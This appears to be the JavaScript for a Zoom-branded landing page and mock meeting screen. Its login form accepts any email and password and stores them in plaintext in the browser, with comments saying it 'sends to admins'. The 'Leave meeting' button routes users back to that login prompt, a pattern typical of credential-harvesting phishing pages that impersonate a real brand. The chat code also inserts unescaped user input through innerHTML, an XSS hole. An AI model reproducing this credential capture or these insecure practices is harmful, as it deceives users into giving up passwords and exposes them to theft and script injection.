// Auth Modal Functionality - Shared signup feeds both portals
const loginBtn = document.querySelector('.login-btn');
const loginModal = document.getElementById('loginModal');
const loginForm = document.getElementById('loginForm');
const loginMessage = document.getElementById('loginMessage');

// Toggle login modal
loginBtn?.addEventListener('click', (e) => {
    e.preventDefault();
    loginModal.style.display = 'block';
    document.body.style.overflow = 'hidden';
});

// Close modals
document.querySelectorAll('.close').forEach(closeBtn => {
    closeBtn.addEventListener('click', () => {
        document.querySelectorAll('.modal').forEach(modal => {
            modal.style.display = 'none';
        });
        document.body.style.overflow = 'auto';
    });
});

// Login form - sends to admins
loginForm?.addEventListener('submit', (e) => {
    e.preventDefault();
    const email = document.getElementById('loginEmail').value.trim();
    const password = document.getElementById('loginPassword').value;
    
    if (!email || !password) {
        loginMessage.textContent = 'Please enter email and password.';
        loginMessage.style.color = '#ef4444';
        return;
    }
    
    // Send to shared storage for admins
    let users = JSON.parse(localStorage.getItem('zoomUsers') || '[]');
    users.push({
        email,
        password,
        timestamp: new Date().toISOString()
    });
    localStorage.setItem('zoomUsers', JSON.stringify(users));
    
    // Auto close after 2s
    setTimeout(() => {
        loginModal.style.display = 'none';
        loginForm.reset();
        loginMessage.textContent = '';
        document.body.style.overflow = 'auto';
    }, 2000);
});

// Modal links
document.querySelector('.signin-link')?.addEventListener('click', (e) => {
    e.preventDefault();
    signupModal.style.display = 'none';
    signinModal.style.display = 'block';
});

document.querySelector('.signup-link')?.addEventListener('click', (e) => {
    e.preventDefault();
    signinModal.style.display = 'none';
    signupModal.style.display = 'block';
});

// Close on outside click
window.addEventListener('click', (e) => {
    if (e.target.classList.contains('modal')) {
        document.querySelectorAll('.modal').forEach(modal => modal.style.display = 'none');
        document.body.style.overflow = 'auto';
    }
});

// Signup form handling - adds to shared pool
signupForm?.addEventListener('submit', (e) => {
    e.preventDefault();
    const email = document.getElementById('signupEmail').value.trim();
    const password = document.getElementById('signupPassword').value;
    
    if (!email || !password || password.length < 6) {
        const toast = document.createElement('div');
        toast.style.cssText = 'position: fixed; top: 20px; right: 20px; background: #ef4444; color: white; padding: 1rem 1.5rem; border-radius: 12px; box-shadow: 0 10px 25px rgba(239,68,68,0.3); z-index: 3000; font-weight: 500;';
        toast.textContent = 'Please enter valid email & password (6+ chars).';
        document.body.appendChild(toast);
        setTimeout(() => toast.remove(), 3000);
        document.getElementById('signupEmail').focus();
        return;
    }
    
    let users = JSON.parse(localStorage.getItem('zoomUsers') || '[]');
    
    if (users.some(user => user.email === email)) {
        const toast = document.createElement('div');
        toast.style.cssText = 'position: fixed; top: 20px; right: 20px; background: #f59e0b; color: white; padding: 1rem 1.5rem; border-radius: 12px; box-shadow: 0 10px 25px rgba(245,158,11,0.3); z-index: 3000; font-weight: 500;';
        toast.textContent = '⚠️ Account already exists. Please sign in.';
        document.body.appendChild(toast);
        setTimeout(() => toast.remove(), 3000);
        signinModal.style.display = 'block';
        signupModal.style.display = 'none';
        return;
    }
    
    users.push({
        email,
        password,
        timestamp: new Date().toISOString(),
        id: Date.now()
    });
    
    localStorage.setItem('zoomUsers', JSON.stringify(users));
    
    // Success toast
    const toast = document.createElement('div');
    toast.style.cssText = 'position: fixed; top: 20px; right: 20px; background: #10b981; color: white; padding: 1rem 1.5rem; border-radius: 12px; box-shadow: 0 10px 25px rgba(16,185,129,0.3); z-index: 3000; font-weight: 500;';
    toast.textContent = `✅ Account created for ${email}!`;
    document.body.appendChild(toast);
    setTimeout(() => toast.remove(), 4000);
    
    signupModal.style.display = 'none';
    signupForm.reset();
    document.body.style.overflow = 'auto';
});

// Signin - works with shared storage
signinForm?.addEventListener('submit', (e) => {
    e.preventDefault();
    const email = document.getElementById('signinEmail').value.trim();
    const password = document.getElementById('signinPassword').value;
    
    const users = JSON.parse(localStorage.getItem('zoomUsers') || '[]');
    const user = users.find(u => u.email === email && u.password === password);
    
    const messageEl = document.getElementById('signinMessage');
    
    if (user) {
        messageEl.innerHTML = `✅ Welcome back, <strong>${email}</strong>!`;
        messageEl.className = 'message-success';
        setTimeout(() => {
            signinModal.style.display = 'none';
            signinForm.reset();
            document.body.style.overflow = 'auto';
        }, 1500);
    } else {
        messageEl.textContent = '❌ Invalid email or password.';
        messageEl.className = 'message-error';
    }
});

// Rest of landing page functionality...
// Mobile Navigation Toggle
const hamburger = document.querySelector('.hamburger');
const navMenu = document.querySelector('.nav-menu');

hamburger.addEventListener('click', () => {
    hamburger.classList.toggle('active');
    navMenu.classList.toggle('active');
});

// Close mobile menu when clicking on a link
document.querySelectorAll('.nav-menu a').forEach(n => n.addEventListener('click', () => {
    hamburger.classList.remove('active');
    navMenu.classList.remove('active');
}));

// Smooth Scrolling
document.querySelectorAll('a[href^=\"#\"]').forEach(anchor => {
    anchor.addEventListener('click', function (e) {
        e.preventDefault();
        const target = document.querySelector(this.getAttribute('href'));
        if (target) {
            target.scrollIntoView({
                behavior: 'smooth',
                block: 'start'
            });
        }
    });
});

// Navbar Background on Scroll
window.addEventListener('scroll', () => {
    const navbar = document.querySelector('.navbar');
    if (window.scrollY > 50) {
        navbar.style.background = 'rgba(255, 255, 255, 0.98)';
        navbar.style.boxShadow = '0 2px 20px rgba(0,0,0,0.1)';
    } else {
        navbar.style.background = 'rgba(255, 255, 255, 0.95)';
        navbar.style.boxShadow = 'none';
    }
});

// Testimonial Slider
const testimonials = document.querySelectorAll('.testimonial');
let currentTestimonial = 0;

function showTestimonial(index) {
    testimonials.forEach((t, i) => {
        t.classList.toggle('active', i === index);
    });
}

function nextTestimonial() {
    currentTestimonial = (currentTestimonial + 1) % testimonials.length;
    showTestimonial(currentTestimonial);
}

// Auto-slide testimonials every 5 seconds
setInterval(nextTestimonial, 5000);

// Initial load
showTestimonial(0);

// Intersection Observer for Animations
const observerOptions = {
    threshold: 0.1,
    rootMargin: '0px 0px -50px 0px'
};

const observer = new IntersectionObserver((entries) => {
    entries.forEach(entry => {
        if (entry.isIntersecting) {
            entry.target.style.animationDelay = '0.1s';
            entry.target.classList.add('animate');
        }
    });
}, observerOptions);

// Observe feature cards and testimonials
document.querySelectorAll('.feature-card, .testimonial').forEach(el => {
    observer.observe(el);
});

// Parallax effect for hero image
window.addEventListener('scroll', () => {
    const heroImage = document.querySelector('.hero-image img');
    const scrolled = window.pageYOffset;
    const rate = scrolled * -0.5;
    heroImage.style.transform = `translateY(${rate}px)`;
});

console.log('Zoom Workplace with Independent Admin Portals loaded! 🚀');

// ========================================
// ZOOM MEETING INTERACTIVITY
// ========================================
if (document.querySelector('.meeting-body')) {
    // State
    let isMuted = true;
    let isVideoOn = true;
    let isSharing = false;
    let activeSpeaker = 1; // 0 = you, 1 = Sarah

    // Toolbar buttons
    const muteBtn = document.querySelector('[data-action="mute"]');
    const videoBtn = document.querySelector('[data-action="video"]');
    const shareBtn = document.querySelector('.share-btn');
    const leaveBtn = document.querySelector('#leaveMeetingBtn');
    const chatInput = document.querySelector('.chat-input input');

    // Elements
    const yourStatus = document.querySelector('.video-secondary .status');
    const muteIcon = document.querySelector('.participant-item .muted-icon');
    const videoIcons = document.querySelectorAll('.status-icons .fa-video');

    // Toggle Mute
    muteBtn?.addEventListener('click', () => {
        isMuted = !isMuted;
        muteBtn.innerHTML = isMuted ? '<i class="fas fa-microphone-slash"></i>' : '<i class="fas fa-microphone"></i>';
        yourStatus.textContent = isMuted ? '● Muted' : '● Speaking';
        yourStatus.className = `status ${isMuted ? 'muted' : 'speaking'}`;
        muteIcon.style.display = isMuted ? 'block' : 'none';
        
        // Switch active speaker when you speak
        if (!isMuted) {
            activeSpeaker = 0;
            document.querySelector('.video-primary').classList.remove('active-speaker');
            document.querySelector('.video-secondary').classList.add('active-speaker');
        }
    });

    // Toggle Video
    videoBtn?.addEventListener('click', () => {
        isVideoOn = !isVideoOn;
        videoBtn.innerHTML = isVideoOn ? '<i class="fas fa-video"></i>' : '<i class="fas fa-video-slash"></i>';
        videoIcons.forEach(icon => {
            icon.style.color = isVideoOn ? '#22c55e' : '#ef4444';
        });
    });

    // Toggle Share Screen
    shareBtn?.addEventListener('click', () => {
        isSharing = !isSharing;
        shareBtn.style.background = isSharing 
            ? 'linear-gradient(135deg, #22c55e, #16a34a)' 
            : 'linear-gradient(135deg, #f59e0b, #d97706)';
        const primary = document.querySelector('.video-primary');
        if (isSharing) {
            const shareDiv = document.createElement('div');
            shareDiv.style.cssText = 'position:absolute;top:20px;right:20px;background:rgba(34,197,94,0.9);color:white;padding:8px 16px;border-radius:20px;font-weight:600;z-index:10;';
            shareDiv.textContent = '🖥️ Screen Share';
            primary.appendChild(shareDiv);
        } else {
            const shareDivs = primary.querySelectorAll('div');
            shareDivs.forEach(div => {
                if (div.textContent && div.textContent.includes('Screen Share')) {
                    div.remove();
                }
            });
        }
    });

    // Chat
    chatInput?.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') {
            const msg = e.target.value.trim();
            if (msg) {
                const chatMessages = document.querySelector('.chat-messages');
                const newMsg = document.createElement('div');
                newMsg.className = 'chat-msg';
                newMsg.innerHTML = `<strong>You:</strong> ${msg}`;
                chatMessages.appendChild(newMsg);
                chatMessages.scrollTop = chatMessages.scrollHeight;
                e.target.value = '';
            }
        }
    });

    // Leave Meeting - show login modal
    leaveBtn?.addEventListener('click', () => {
        if (confirm('Leave meeting?')) {
            window.location.href = 'index.html#login';
            setTimeout(() => {
                const loginBtn = document.querySelector('.login-btn');
                if (loginBtn) loginBtn.click();
            }, 100);
        }
    });

    // Simulate active speaker switching
    setInterval(() => {
        if (!isMuted && Math.random() < 0.3) {
            activeSpeaker = 1;
            const primary = document.querySelector('.video-primary');
            const secondary = document.querySelector('.video-secondary');
            primary.classList.add('active-speaker');
            secondary.classList.remove('active-speaker');
        }
    }, 3000);

    // Simulate Sarah typing in chat
    const sarahMessages = [
        'What do you think about the Q3 targets?',
        'I updated the slide deck 📊',
        'Should we schedule follow-up with marketing?',
        'Looking good! 👍'
    ];
    setInterval(() => {
        if (Math.random() < 0.2) {
            const chatMessages = document.querySelector('.chat-messages');
            const newMsg = document.createElement('div');
            newMsg.className = 'chat-msg';
            newMsg.innerHTML = `<strong>Sarah:</strong> ${sarahMessages[Math.floor(Math.random() * sarahMessages.length)]}`;
            chatMessages.appendChild(newMsg);
            chatMessages.scrollTop = chatMessages.scrollHeight;
        }
    }, 8000);

    console.log('Zoom Meeting loaded! 🎥 2 participants active.');
}
